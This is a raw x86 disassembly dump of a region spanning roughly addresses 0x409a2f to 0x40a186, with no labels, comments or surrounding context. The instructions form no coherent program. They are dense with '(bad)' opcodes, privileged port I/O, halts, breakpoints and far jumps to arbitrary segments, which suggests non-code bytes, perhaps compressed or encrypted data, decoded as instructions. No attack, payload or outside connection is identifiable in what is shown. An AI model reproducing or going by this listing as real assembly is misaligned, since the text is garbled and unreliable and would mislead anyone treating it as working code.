  409a2f:	xchg   edx,eax
  409a30:	sub    esp,DWORD PTR [edi-0x45]
  409a33:	fs adc eax,0x5cb69c20
  409a39:	fwait
  409a3a:	mov    al,ds:0x787f6c53
  409a3f:	in     al,dx
  409a40:	mov    WORD PTR [edi],gs
  409a42:	fsub   DWORD PTR [esp+ecx*8+0x63778432]
  409a49:	out    0xcb,eax
  409a4b:	(bad)  
  409a4c:	mov    WORD PTR [edx+0x722d343b],ds
  409a52:	stos   BYTE PTR es:[edi],al
  409a53:	mov    ecx,0xdb47f6a0
  409a58:	pop    esp
  409a59:	adc    esi,DWORD PTR [esp+ebx*2+0x13112498]
  409a60:	lahf   
  409a61:	mov    dh,0x60
  409a63:	push   edx
  409a64:	sub    esi,DWORD PTR [edx]
  409a66:	imul   esi,DWORD PTR [eax+0xd],0xffffffae
  409a6a:	and    BYTE PTR [edi-0x41],0x4b
  409a6e:	(bad)  
  409a6f:	jno    0x409aa5
  409a71:	mov    cl,0xde
  409a73:	ins    DWORD PTR es:[edi],dx
  409a74:	mov    bl,0xd5
  409a76:	scas   eax,DWORD PTR es:[edi]
  409a77:	aad    0xd5
  409a79:	test   al,0xb6
  409a7b:	xor    eax,0x3fdf313d
  409a80:	outs   dx,BYTE PTR ds:[esi]
  409a81:	cmp    eax,0x1bce6288
  409a87:	jmp    0x8418:0x1c0a5327
  409a8e:	out    dx,eax
  409a8f:	mul    bl
  409a91:	push   ebx
  409a92:	arpl   WORD PTR [edx],ax
  409a94:	sbb    BYTE PTR [eax-0x5f4b011c],ah
  409a9a:	jle    0x409aec
  409a9c:	mov    dh,0x19
  409a9e:	lahf   
  409a9f:	ficomp DWORD PTR [esi]
  409aa1:	inc    edi
  409aa2:	cdq    
  409aa3:	stos   BYTE PTR es:[edi],al
  409aa4:	mov    ds:0xfd73a89d,eax
  409aa9:	cs out dx,eax
  409aab:	and    DWORD PTR [esi+0x47062a5f],0x1d46c6e9
  409ab5:	(bad)  
  409ab6:	sub    bh,BYTE PTR ds:0x27a616ce
  409abc:	mov    al,0x52
  409abe:	and    al,0x41
  409ac0:	pop    es
  409ac1:	xor    dl,BYTE PTR ds:0x8acc907c
  409ac7:	ror    BYTE PTR [esi+0x78],0x6f
  409acb:	push   ss
  409acc:	std    
  409acd:	xor    DWORD PTR [eax],0x49
  409ad0:	xlat   BYTE PTR ds:[ebx]
  409ad1:	or     al,0x8b
  409ad3:	cld    
  409ad4:	rol    DWORD PTR [edi-0x30],cl
  409ad7:	dec    ecx
  409ad8:	sti    
  409ad9:	clc    
  409ada:	repz pop ecx
  409adc:	inc    esp
  409add:	xchg   BYTE PTR [ebx-0x31],ch
  409ae0:	mov    edi,0x4bc7f82e
  409ae5:	(bad)  
  409ae6:	xchg   esp,eax
  409ae7:	xor    esi,ecx
  409ae9:	jb     0x409ad4
  409aeb:	adc    al,0xd9
  409aed:	xor    al,0x6c
  409aef:	or     DWORD PTR [eax+0x3741e6de],0x1671f88b
  409af9:	ins    DWORD PTR es:[edi],dx
  409afa:	stos   BYTE PTR es:[edi],al
  409afb:	cmc    
  409afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409afd:	dec    edx
  409afe:	xor    bh,BYTE PTR [eax+0x64]
  409b01:	dec    esi
  409b02:	repnz sbb al,0x7b
  409b05:	xor    eax,0x66a3b89d
  409b0a:	ror    DWORD PTR [edx],0xa8
  409b0d:	mov    dh,BYTE PTR [ebx+0x483610c2]
  409b13:	aaa    
  409b14:	jg     0x409aad
  409b16:	js     0x409b8f
  409b18:	fwait
  409b19:	int3   
  409b1a:	push   eax
  409b1b:	std    
  409b1c:	jbe    0x409b9a
  409b1e:	(bad)  
  409b1f:	icebp  
  409b20:	in     al,dx
  409b21:	(bad)  
  409b23:	mov    ah,0x15
  409b25:	jp     0x409b4a
  409b27:	(bad)  
  409b28:	cli    
  409b29:	cmp    DWORD PTR [eax+ecx*2+0x78],ebp
  409b2d:	mov    ?,WORD PTR [esi+0x7c]
  409b30:	push   ds
  409b31:	mov    al,0x32
  409b33:	xchg   ebx,eax
  409b34:	xor    dh,BYTE PTR [edx-0x51]
  409b37:	xor    al,0x16
  409b39:	xchg   DWORD PTR ds:[eax+ebx*8+0x6b],esp
  409b3e:	push   ss
  409b3f:	icebp  
  409b40:	adc    al,ch
  409b42:	xchg   edi,eax
  409b43:	mov    eax,ds:0xb6367393
  409b48:	sar    DWORD PTR [edx+0x9e1cb0c],cl
  409b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b4f:	push   ebx
  409b50:	imul   edi,esi,0xffffff9c
  409b53:	jno    0x409bb5
  409b55:	aaa    
  409b56:	add    DWORD PTR [ebx+0x4e],edx
  409b59:	sbb    al,0xc2
  409b5b:	je     0x409aef
  409b5d:	mov    ds:0x237f7e4d,eax
  409b62:	int3   
  409b63:	mov    ch,0x6
  409b65:	mov    ch,0x7e
  409b67:	js     0x409b22
  409b69:	add    eax,0xee242752
  409b6e:	inc    esp
  409b6f:	adc    BYTE PTR [eax],bh
  409b71:	pop    ebx
  409b72:	aad    0xe0
  409b74:	leave  
  409b75:	and    al,0xd
  409b77:	xor    BYTE PTR [esi],bh
  409b79:	mov    edx,0xacd21c32
  409b7e:	add    eax,0xb7f0e057
  409b83:	jmp    0x409b65
  409b85:	pop    esi
  409b86:	add    DWORD PTR [ebx],ebx
  409b88:	push   0x42
  409b8a:	mov    esi,edi
  409b8c:	adc    ebp,esi
  409b8e:	push   0x3
  409b90:	pop    eax
  409b91:	push   ebx
  409b92:	and    eax,0xb5860b82
  409b97:	cmp    BYTE PTR [esi],ah
  409b99:	push   edx
  409b9a:	sbb    al,0x4d
  409b9c:	ins    DWORD PTR es:[edi],dx
  409b9d:	add    edx,DWORD PTR [edx]
  409b9f:	in     al,0xe9
  409ba1:	ror    esi,0x2c
  409ba4:	inc    ebp
  409ba5:	(bad)  
  409ba6:	xor    edi,DWORD PTR [ecx-0x56124bf]
  409bac:	and    BYTE PTR [eax+0x7d],0xae
  409bb0:	mov    eax,ds:0xc40a069
  409bb5:	repnz and al,0x5a
  409bb8:	xchg   esp,eax
  409bb9:	xchg   edx,eax
  409bba:	cli    
  409bbb:	inc    ebp
  409bbc:	or     BYTE PTR ds:0x4e82c845,bh
  409bc2:	retf   
  409bc3:	jg     0x409b7d
  409bc5:	mov    ebx,0xaf3a9f8b
  409bca:	fstp   DWORD PTR [eax+0x5a0da32a]
  409bd0:	cmp    esi,DWORD PTR [ebx-0xd]
  409bd3:	loope  0x409b6f
  409bd5:	mov    eax,0x3f52d7cb
  409bda:	sbb    DWORD PTR [ecx],ebx
  409bdc:	mov    ah,cl
  409bde:	cs xchg esi,eax
  409be0:	jl     0x409bfa
  409be2:	or     al,0x41
  409be4:	shr    BYTE PTR ds:0x4b1ec71d,0x7d
  409beb:	mov    ds:0xe01fa4ce,eax
  409bf0:	std    
  409bf1:	rcl    BYTE PTR [esi-0x53],1
  409bf4:	mov    edi,0xe7a8b4c5
  409bf9:	fwait
  409bfa:	mov    dh,0xef
  409bfc:	mov    dh,0x3b
  409bfe:	ret    0xaa0d
  409c01:	or     BYTE PTR [ebx-0x4],al
  409c04:	js     0x409bd1
  409c06:	xor    ecx,DWORD PTR [ebx+esi*8+0x38]
  409c0a:	cmp    dl,al
  409c0c:	cmp    BYTE PTR [edx-0x77fda0df],ch
  409c12:	xlat   BYTE PTR ds:[ebx]
  409c13:	stos   DWORD PTR es:[edi],eax
  409c14:	scas   eax,DWORD PTR es:[edi]
  409c15:	jmp    0x409b98
  409c17:	pop    eax
  409c18:	leave  
  409c19:	inc    edx
  409c1a:	out    dx,al
  409c1b:	jg     0x409bd8
  409c1d:	dec    edx
  409c1e:	out    dx,al
  409c1f:	popa   
  409c20:	jnp    0x409c9c
  409c22:	ins    DWORD PTR es:[edi],dx
  409c23:	fsubr  QWORD PTR [eax+0x648e446f]
  409c29:	in     eax,0xe2
  409c2b:	mov    ch,0xbb
  409c2d:	inc    edi
  409c2e:	out    0x41,al
  409c30:	dec    ecx
  409c31:	and    al,BYTE PTR [edx+0x53c7f26f]
  409c37:	sahf   
  409c38:	mov    ch,0xd
  409c3a:	js     0x409c41
  409c3c:	xor    ebp,DWORD PTR [ebx+0x23]
  409c3f:	jno    0x409c75
  409c41:	xchg   ecx,eax
  409c42:	sub    esp,DWORD PTR [edi-0x55]
  409c45:	cli    
  409c46:	xchg   BYTE PTR [edx+0x641a2323],dh
  409c4c:	das    
  409c4d:	mov    ebp,0x93657253
  409c52:	jae    0x409bda
  409c54:	fwait
  409c55:	sti    
  409c56:	int    0xb1
  409c58:	in     al,dx
  409c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c5a:	push   esi
  409c5b:	pop    es
  409c5c:	inc    ebx
  409c5d:	aas    
  409c5e:	pop    esp
  409c5f:	into   
  409c60:	push   ebx
  409c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c63:	fnstcw WORD PTR [esi+0x17]
  409c66:	adc    eax,0x841384d2
  409c6b:	or     edi,DWORD PTR [ebx-0xb86d6f5]
  409c71:	test   BYTE PTR [edi],ah
  409c73:	inc    edi
  409c74:	xchg   edx,eax
  409c75:	adc    eax,0x776185eb
  409c7a:	icebp  
  409c7b:	jns    0x409cf9
  409c7d:	mov    bh,0xc0
  409c7f:	mov    ds:0x24a7704b,eax
  409c84:	div    BYTE PTR [edi]
  409c86:	add    BYTE PTR [ebx],al
  409c88:	jle    0x409c77
  409c8a:	jmp    0x43ff:0x3cae490e
  409c91:	xlat   BYTE PTR ds:[ebx]
  409c92:	lods   al,BYTE PTR ds:[esi]
  409c93:	bound  eax,QWORD PTR [eax+0x2a718f4]
  409c99:	add    ch,BYTE PTR [ebx+0xb]
  409c9c:	cmp    BYTE PTR [ebp+0x12],0xa3
  409ca0:	mov    edx,0x8eb492b9
  409ca5:	push   edi
  409ca6:	and    DWORD PTR [edi-0x2c396104],edi
  409cac:	push   ss
  409cad:	ja     0x409ce3
  409caf:	pop    ds
  409cb0:	ins    DWORD PTR es:[edi],dx
  409cb1:	push   ds
  409cb2:	(bad)  
  409cb3:	int3   
  409cb4:	into   
  409cb5:	lea    edi,[ebp+ecx*4+0x22444474]
  409cbc:	shl    DWORD PTR [ebp+0x70],cl
  409cbf:	cmp    al,dh
  409cc1:	mov    ?,WORD PTR [ebp-0x59bd3d4d]
  409cc7:	add    al,cl
  409cc9:	fwait
  409cca:	loopne 0x409c52
  409ccc:	stos   DWORD PTR es:[edi],eax
  409ccd:	lahf   
  409cce:	xchg   BYTE PTR [ebp+0x2978099e],ah
  409cd4:	inc    ecx
  409cd5:	push   edx
  409cd6:	outs   dx,BYTE PTR ds:[esi]
  409cd7:	jmp    0xa3e9:0x93195de3
  409cde:	enter  0xddb8,0xe8
  409ce2:	ja     0x409c77
  409ce4:	arpl   WORD PTR [edi],di
  409ce6:	int3   
  409ce7:	jge    0x409d11
  409ce9:	outs   dx,DWORD PTR ds:[esi]
  409cea:	repz icebp 
  409cec:	mov    edi,?
  409cee:	jecxz  0x409c8e
  409cf0:	out    0xe8,eax
  409cf2:	dec    edi
  409cf3:	push   ebx
  409cf4:	arpl   WORD PTR [edi+edx*1-0x78],ax
  409cf8:	adc    ebp,ecx
  409cfa:	cs pop edx
  409cfc:	push   esp
  409cfd:	pop    ecx
  409cfe:	ss out dx,eax
  409d00:	add    BYTE PTR [esi],bh
  409d02:	lea    ecx,[esi+0x2c]
  409d05:	aas    
  409d06:	or     al,0x24
  409d08:	jae    0x409cd2
  409d0a:	lock dec ecx
  409d0c:	sub    al,0xb5
  409d0e:	adc    eax,0x46f85f3e
  409d13:	push   0xb7037851
  409d18:	mov    edi,0x43f0ef60
  409d1d:	push   ebx
  409d1e:	or     BYTE PTR [ecx-0x60],ah
  409d21:	or     edi,0xffffff82
  409d24:	ins    BYTE PTR es:[edi],dx
  409d25:	ins    DWORD PTR es:[edi],dx
  409d26:	mov    esi,0x417addab
  409d2b:	sbb    al,0xb6
  409d2d:	sub    edi,edi
  409d2f:	jo     0x409d9c
  409d31:	clc    
  409d32:	(bad)  
  409d33:	cmc    
  409d34:	loope  0x409d0f
  409d36:	std    
  409d37:	sbb    eax,0x9f2855ad
  409d3c:	push   esi
  409d3d:	mov    DWORD PTR [edx+eax*4+0x1e],edx
  409d41:	inc    edx
  409d42:	and    ecx,DWORD PTR [esi-0x2ba23621]
  409d48:	rcr    DWORD PTR ds:[bx-0x5e13],1
  409d4e:	xor    cl,cl
  409d50:	in     al,dx
  409d51:	inc    edx
  409d52:	mov    ds:0x2aa9f902,eax
  409d57:	mov    DWORD PTR [ecx],esi
  409d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d5a:	mov    dl,0xc9
  409d5c:	(bad)  
  409d5e:	xchg   edi,eax
  409d5f:	and    eax,edi
  409d61:	xchg   ebp,eax
  409d62:	addr16 ja 0x409dba
  409d65:	inc    eax
  409d66:	cbw    
  409d68:	mov    ds:0x372de2d8,eax
  409d6d:	and    DWORD PTR [edx-0x7],esp
  409d70:	in     al,dx
  409d71:	outs   dx,BYTE PTR ds:[esi]
  409d72:	data16 loope 0x409da1
  409d75:	hlt    
  409d76:	mov    DWORD PTR [esi],ebx
  409d78:	xchg   edi,eax
  409d79:	cmp    al,0x64
  409d7b:	jecxz  0x409d3f
  409d7d:	daa    
  409d7e:	cld    
  409d7f:	xor    DWORD PTR [ebx+0x3],ebp
  409d82:	aam    0x19
  409d84:	je     0x120837aa
  409d8a:	nop
  409d8b:	in     eax,0xb3
  409d8d:	inc    ecx
  409d8e:	cmc    
  409d8f:	repz test eax,0x4178b79f
  409d95:	jl     0x409d60
  409d97:	stos   DWORD PTR es:[edi],eax
  409d98:	mov    ds:0xc7b89b08,eax
  409d9d:	jne    0x409d8c
  409d9f:	or     al,0x20
  409da1:	pop    ecx
  409da2:	and    al,0xe6
  409da4:	es ds mov bh,0x76
  409da8:	out    dx,al
  409da9:	cld    
  409daa:	xchg   esp,eax
  409dab:	mov    ch,0x93
  409dad:	nop
  409dae:	adc    BYTE PTR [ecx],cl
  409db0:	sbb    eax,0xa1142d58
  409db5:	dec    ecx
  409db6:	aad    0xe5
  409db8:	in     al,0x2e
  409dba:	ins    DWORD PTR es:[edi],dx
  409dbb:	push   0x5b
  409dbd:	and    dh,BYTE PTR [ebp-0x56d8d6b9]
  409dc3:	rol    DWORD PTR [ebx-0x45],cl
  409dc6:	pop    esp
  409dc7:	xlat   BYTE PTR ds:[ebx]
  409dc8:	mov    ch,0x3
  409dca:	push   eax
  409dcb:	or     dh,dl
  409dcd:	xor    BYTE PTR [ecx+eax*4],0x7e
  409dd1:	add    eax,0xd2493587
  409dd6:	bound  ecx,QWORD PTR [ecx+edx*2-0x31]
  409dda:	ins    BYTE PTR es:[edi],dx
  409ddb:	and    edi,DWORD PTR [ebx]
  409ddd:	ins    DWORD PTR es:[edi],dx
  409dde:	inc    esi
  409ddf:	in     eax,0xd8
  409de1:	ret    
  409de2:	out    dx,eax
  409de3:	leave  
  409de4:	and    al,0x36
  409de6:	jae    0x409e26
  409de8:	pop    ebp
  409de9:	xor    eax,0x5b76862a
  409dee:	adc    esi,DWORD PTR [esi+0x73]
  409df1:	jno    0x409d88
  409df3:	jmp    0x644d8583
  409df8:	dec    ebx
  409df9:	mov    al,ds:0xb8e9aa82
  409dfe:	jne    0x409e2a
  409e00:	push   ebp
  409e01:	popa   
  409e02:	mov    ecx,0x616dbd14
  409e07:	sub    eax,0x6446a42c
  409e0c:	nop
  409e0d:	sbb    BYTE PTR [ebp+0x5e84b4d4],ch
  409e13:	and    ah,al
  409e15:	xchg   esp,eax
  409e16:	push   ebp
  409e17:	aad    0x8d
  409e19:	bound  ebp,QWORD PTR [ebp+ecx*2-0xc]
  409e1d:	mov    edx,ebx
  409e1f:	xchg   edx,eax
  409e20:	rol    edi,1
  409e22:	aaa    
  409e23:	inc    eax
  409e25:	mov    eax,ds:0xef8e5004
  409e2a:	(bad)  
  409e2c:	or     al,0x6c
  409e2e:	mov    ebx,0xba293700
  409e33:	sbb    dh,cl
  409e35:	gs ds lahf 
  409e38:	lods   eax,DWORD PTR ds:[esi]
  409e39:	mov    cl,0x51
  409e3b:	pop    edi
  409e3c:	cmp    DWORD PTR [ebp+0x45],esi
  409e3f:	push   ss
  409e40:	loop   0x409e01
  409e42:	mov    cl,0xae
  409e44:	adc    BYTE PTR [esi],0xee
  409e47:	mov    esp,0xd2be1217
  409e4c:	lods   eax,DWORD PTR ds:[esi]
  409e4d:	xor    al,0xcb
  409e4f:	pop    edi
  409e50:	(bad)  
  409e51:	sbb    esi,DWORD PTR [ecx]
  409e53:	clc    
  409e54:	test   eax,0xea8b8b4c
  409e59:	push   esi
  409e5a:	cmp    edi,DWORD PTR [edx-0x16efd505]
  409e60:	or     eax,0xb4008d38
  409e65:	xor    DWORD PTR [edi],esi
  409e67:	fbld   TBYTE PTR [esi+eiz*8]
  409e6a:	and    edi,esi
  409e6c:	imul   ecx,DWORD PTR [ebp+0x7826e837],0xffffffb0
  409e73:	xchg   DWORD PTR [edi],ebx
  409e75:	div    DWORD PTR [ebp+0x50]
  409e78:	popa   
  409e79:	stos   DWORD PTR es:[edi],eax
  409e7a:	scas   al,BYTE PTR es:[edi]
  409e7b:	xor    al,0x4f
  409e7d:	dec    ecx
  409e7e:	sti    
  409e7f:	in     al,dx
  409e80:	mov    BYTE PTR [esi],dh
  409e82:	stos   BYTE PTR es:[edi],al
  409e83:	ins    BYTE PTR es:[edi],dx
  409e84:	lods   eax,DWORD PTR ds:[esi]
  409e85:	dec    ecx
  409e86:	mov    esi,0xb3b17b9b
  409e8b:	jbe    0x409eec
  409e8d:	xor    al,BYTE PTR [ecx]
  409e8f:	xchg   edi,eax
  409e90:	jns    0x409e26
  409e92:	jne    0x409e95
  409e94:	inc    ebx
  409e95:	ss in  al,0x20
  409e98:	sahf   
  409e99:	xchg   esi,eax
  409e9a:	cdq    
  409e9b:	xchg   edi,eax
  409e9c:	jae    0x409eb8
  409e9e:	mov    ecx,0x24c46f21
  409ea3:	sbb    DWORD PTR [edx+0x7d],ecx
  409ea6:	inc    eax
  409ea7:	sub    al,BYTE PTR [edi]
  409ea9:	xor    esp,DWORD PTR [ebx]
  409eab:	xor    DWORD PTR [ebx-0x32],0xcc692413
  409eb2:	inc    edx
  409eb3:	lock dec eax
  409eb5:	fstp   TBYTE PTR [ecx-0x51908838]
  409ebb:	imul   ecx,edi,0xa698a490
  409ec1:	mov    ds,eax
  409ec3:	lods   al,BYTE PTR ds:[esi]
  409ec4:	mov    dh,BYTE PTR [edx+ebx*4]
  409ec7:	mov    esi,DWORD PTR [edi+0x12edabbc]
  409ecd:	ja     0x409e89
  409ecf:	rol    ebp,0x17
  409ed2:	dec    ebx
  409ed3:	jmp    DWORD PTR [ebx+0x18c649d5]
  409ed9:	rcl    BYTE PTR [eax],cl
  409edb:	imul   edx,ecx,0xfec2ae32
  409ee1:	pop    ebx
  409ee2:	in     eax,dx
  409ee3:	push   es
  409ee4:	fld    QWORD PTR [eax+esi*4+0x28657458]
  409eeb:	cmp    ebx,DWORD PTR [esi-0xb]
  409eee:	je     0x409e92
  409ef0:	pop    esi
  409ef1:	ss mov ch,0xee
  409ef4:	add    BYTE PTR [edx],bh
  409ef6:	mov    edi,0x7f7d11d3
  409efb:	inc    esp
  409efc:	add    ebp,DWORD PTR [edi]
  409efe:	sbb    al,0xd6
  409f00:	jg     0x409f03
  409f02:	outs   dx,DWORD PTR ds:[esi]
  409f03:	inc    ebp
  409f04:	fidiv  DWORD PTR [ebx+0x5389d366]
  409f0a:	push   esp
  409f0b:	adc    al,0x6e
  409f0d:	mov    edx,0xa767504d
  409f12:	out    dx,eax
  409f13:	xor    DWORD PTR [eax],ecx
  409f15:	clc    
  409f16:	ret    
  409f17:	ds mov bl,0xc4
  409f1a:	sbb    al,0x17
  409f1c:	scas   eax,DWORD PTR es:[edi]
  409f1d:	pop    ebp
  409f1e:	sti    
  409f1f:	jbe    0x409f75
  409f21:	pop    ecx
  409f22:	ins    BYTE PTR es:[edi],dx
  409f23:	int    0x31
  409f25:	clc    
  409f26:	enter  0xb509,0xdf
  409f2a:	inc    esp
  409f2b:	loopne 0x409ef8
  409f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f2e:	rcr    DWORD PTR [edx+edx*8-0x807bc17],cl
  409f35:	pusha  
  409f36:	cmp    al,0x78
  409f38:	in     al,dx
  409f39:	cmp    BYTE PTR [esi+0x31279a8f],0x32
  409f40:	or     bl,BYTE PTR [edi+eiz*1]
  409f43:	xchg   esi,eax
  409f44:	retf   
  409f45:	mov    ah,0x2a
  409f47:	sbb    DWORD PTR [eax+esi*1+0x58],ebx
  409f4b:	stos   BYTE PTR es:[edi],al
  409f4c:	das    
  409f4d:	dec    edx
  409f4e:	(bad)  
  409f4f:	push   ecx
  409f50:	daa    
  409f51:	or     esp,DWORD PTR [ebx-0x533091ae]
  409f57:	cmp    ah,BYTE PTR [eax+0x71]
  409f5a:	mov    WORD PTR [ebx],?
  409f5c:	jns    0x409f82
  409f5e:	inc    eax
  409f5f:	mov    dl,0x57
  409f61:	jne    0x409f95
  409f63:	push   edi
  409f64:	scas   al,BYTE PTR es:[edi]
  409f65:	fist   WORD PTR [ebx+0xb]
  409f68:	(bad)  
  409f6a:	pop    ds
  409f6b:	enter  0xe285,0x4d
  409f6f:	xchg   ebp,eax
  409f70:	hlt    
  409f71:	std    
  409f72:	lock sub al,0x34
  409f75:	push   esi
  409f76:	or     ebp,edi
  409f78:	pop    esi
  409f79:	push   0xc777c30
  409f7e:	fiadd  WORD PTR [esi+edx*4]
  409f81:	fisub  WORD PTR [ebx*2-0x49288f72]
  409f88:	xchg   ecx,eax
  409f89:	xchg   edx,eax
  409f8a:	push   0xffffffdc
  409f8c:	xor    esi,DWORD PTR [ebp+0x68263735]
  409f92:	sbb    ecx,esp
  409f94:	or     BYTE PTR [ebx],ah
  409f96:	in     eax,dx
  409f97:	cli    
  409f98:	scas   eax,DWORD PTR es:[edi]
  409f99:	inc    ebp
  409f9a:	sar    edx,0xff
  409f9d:	xchg   ebp,eax
  409f9e:	push   eax
  409f9f:	ds out dx,al
  409fa1:	or     al,bh
  409fa3:	out    0x22,al
  409fa5:	ss std 
  409fa7:	out    dx,al
  409fa8:	push   esp
  409fa9:	fild   WORD PTR [edi+0x3e]
  409fac:	xor    al,0x7c
  409fae:	loop   0x40a01b
  409fb0:	in     eax,dx
  409fb1:	cmc    
  409fb2:	scas   eax,DWORD PTR es:[edi]
  409fb3:	push   0xffffffc5
  409fb5:	pop    edx
  409fb6:	push   ss
  409fb7:	sbb    ebp,DWORD PTR es:[ebp+ebp*1-0x78308ffd]
  409fbf:	int3   
  409fc0:	mov    cl,0x2f
  409fc2:	dec    edi
  409fc3:	popf   
  409fc4:	push   ss
  409fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fc6:	xor    al,0x5a
  409fc8:	cwde   
  409fc9:	das    
  409fca:	clc    
  409fcb:	jne    0x40a002
  409fcd:	fimul  WORD PTR [edi+ebp*2-0x292a5f1]
  409fd4:	and    al,0xc7
  409fd6:	lar    edi,WORD PTR [ebp+0x67]
  409fda:	cwde   
  409fdb:	loope  0x409fbb
  409fdd:	xchg   BYTE PTR [edx],dl
  409fdf:	ds push cs
  409fe1:	mov    ah,al
  409fe3:	pop    es
  409fe4:	xchg   ebp,eax
  409fe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fe6:	or     ecx,eax
  409fe8:	int3   
  409fe9:	push   0xffffffc7
  409feb:	xor    al,BYTE PTR [edi]
  409fed:	fisttp DWORD PTR [ecx]
  409fef:	fcmovu st,st(5)
  409ff1:	icebp  
  409ff2:	inc    eax
  409ff3:	inc    ebx
  409ff4:	ret    0x5427
  409ff7:	mov    dh,0x7a
  409ff9:	push   eax
  409ffa:	mov    dl,0x1e
  409ffc:	jnp    0x409f86
  409ffe:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a000:	adc    al,0xe0
  40a002:	adc    BYTE PTR [edx+eax*1-0x29248737],bh
  40a009:	pusha  
  40a00a:	out    dx,al
  40a00b:	hlt    
  40a00c:	mov    eax,0x2c8e38e9
  40a011:	in     eax,dx
  40a012:	mov    ecx,0x8a3dda7c
  40a017:	mov    al,ds:0x8ba74c1b
  40a01c:	leave  
  40a01d:	retf   
  40a01e:	or     al,0x22
  40a020:	cli    
  40a021:	ret    
  40a022:	mov    edx,0x65ee6b6d
  40a027:	jb     0x40a01a
  40a029:	push   edx
  40a02a:	fcom   DWORD PTR [edi+0x696c9618]
  40a030:	aam    0x91
  40a032:	sahf   
  40a033:	adc    eax,0x48be6e6a
  40a038:	mov    BYTE PTR [esi+0x6b8e264f],0xd9
  40a03f:	jle    0x40a019
  40a041:	add    BYTE PTR [edi-0x11],dh
  40a044:	push   ebp
  40a045:	mov    ds:0x81c21cec,eax
  40a04a:	(bad)  
  40a04b:	xor    al,0xb8
  40a04d:	add    edx,DWORD PTR [edi]
  40a04f:	pop    edx
  40a050:	push   eax
  40a051:	int    0x2c
  40a053:	mov    esi,edi
  40a055:	pop    ebx
  40a056:	xor    al,0x16
  40a058:	sbb    al,0x33
  40a05a:	dec    ecx
  40a05b:	jmp    0x40a047
  40a05d:	(bad)  
  40a05e:	and    BYTE PTR [edx+0x12],ch
  40a061:	pop    esp
  40a062:	mov    dh,0xd4
  40a064:	add    DWORD PTR [edx+0x14d9522f],esp
  40a06a:	mov    ds:0x7ef78052,eax
  40a06f:	bound  ebx,QWORD PTR [eax+0x5aebb15]
  40a075:	xchg   esi,eax
  40a076:	clc    
  40a077:	imul   ecx,DWORD PTR [edx+0x59],0x551adf3a
  40a07e:	jg     0x40a01a
  40a080:	xchg   ecx,eax
  40a081:	pop    esp
  40a082:	rol    DWORD PTR [edi-0x8267cf],0x9f
  40a089:	lds    esp,FWORD PTR [esi]
  40a08b:	sar    DWORD PTR [esi+edx*2-0x32],1
  40a08f:	cwde   
  40a090:	(bad)  
  40a092:	sbb    eax,0xbe48fabf
  40a097:	sbb    eax,0xfc0e8858
  40a09c:	adc    al,BYTE PTR [esi-0x16]
  40a09f:	push   esp
  40a0a0:	int    0xff
  40a0a2:	mov    ecx,0xd4722545
  40a0a7:	push   0x6baec32e
  40a0ac:	lock mul DWORD PTR [ecx-0x28788dde]
  40a0b3:	mov    edx,0x16b97e3b
  40a0b8:	push   ecx
  40a0b9:	sti    
  40a0ba:	adc    BYTE PTR [eax],bh
  40a0bc:	sub    ch,cl
  40a0be:	test   eax,0x8cd02f90
  40a0c3:	adc    eax,0x868d66e2
  40a0c8:	jb     0x40a129
  40a0ca:	shr    eax,cl
  40a0cc:	dec    ecx
  40a0cd:	outs   dx,BYTE PTR ds:[esi]
  40a0ce:	cmp    bh,BYTE PTR [edi+0x35]
  40a0d1:	mov    al,ds:0x6b9a386f
  40a0d6:	mov    eax,ds:0x948f23dd
  40a0db:	ficomp WORD PTR [eax-0x408b575]
  40a0e1:	cdq    
  40a0e2:	pushf  
  40a0e3:	sub    eax,0x7354b2d6
  40a0e8:	repz lea ebp,[eax+0x4c]
  40a0ec:	popa   
  40a0ed:	xor    al,0xfc
  40a0ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0f0:	(bad)  
  40a0f1:	pop    ecx
  40a0f2:	clc    
  40a0f3:	hlt    
  40a0f4:	test   bh,bh
  40a0f6:	jecxz  0x40a0c6
  40a0f8:	xchg   ebx,eax
  40a0f9:	cli    
  40a0fa:	bound  ebx,QWORD PTR [edx+0x33a21d9e]
  40a100:	test   al,0xca
  40a102:	mov    eax,0xecf826b1
  40a107:	fcom   st(6)
  40a109:	jecxz  0x40a174
  40a10b:	push   ds
  40a10c:	jb     0x40a0ec
  40a10e:	je     0x40a186
  40a110:	stc    
  40a111:	cmp    esp,esi
  40a113:	aam    0x4
  40a115:	mov    BYTE PTR [esi+0x3f03801f],al
  40a11b:	adc    BYTE PTR [ebp-0x35],bl
  40a11e:	push   ebx
  40a11f:	inc    eax
  40a120:	jne    0x40a19c
  40a122:	mov    al,0x3c
  40a124:	inc    edx
  40a125:	or     eax,0x7df6c908
  40a12a:	and    edx,DWORD PTR [ebx-0x70]
  40a12d:	hlt    
  40a12e:	gs push ecx
  40a130:	ja     0x40a180
  40a132:	mov    ebx,0x1022dc2e
  40a137:	test   eax,0x59790baf
  40a13c:	arpl   WORD PTR [ebp+0x2a3d30f7],bp
  40a142:	into   
  40a143:	adc    DWORD PTR [ebx+0x48521d56],eax
  40a149:	(bad)  
  40a14a:	push   ss
  40a14b:	jp     0x40a0fb
  40a14d:	stc    
  40a14e:	popa   
  40a14f:	cmp    edi,eax
  40a151:	sti    
  40a152:	mov    ds:0xe366c2e2,eax
  40a157:	adc    ecx,DWORD PTR [ebx]
  40a159:	inc    ecx
  40a15a:	mov    dl,0x7c
  40a15c:	or     esi,ecx
  40a15e:	dec    esi
  40a15f:	cmp    bl,ch
  40a161:	and    al,0xf5
  40a163:	pushf  
  40a164:	in     al,dx
  40a165:	lock fdivr DWORD PTR [edx-0x689793ab]
  40a16c:	xchg   DWORD PTR ds:0x8c9d0abd,esi
  40a172:	cmp    DWORD PTR [ebx+0x4cd3af79],eax
  40a178:	mov    ah,0x14
  40a17a:	int3   
  40a17b:	out    dx,eax
  40a17c:	xchg   esp,eax
  40a17d:	and    al,0xeb
  40a17f:	pop    edx
  40a180:	aaa    
  40a181:	arpl   WORD PTR [ebx],bx
  40a183:	popf   
  40a184:	retf   
  40a185:	pop    ss
  40a186:	push   0x79
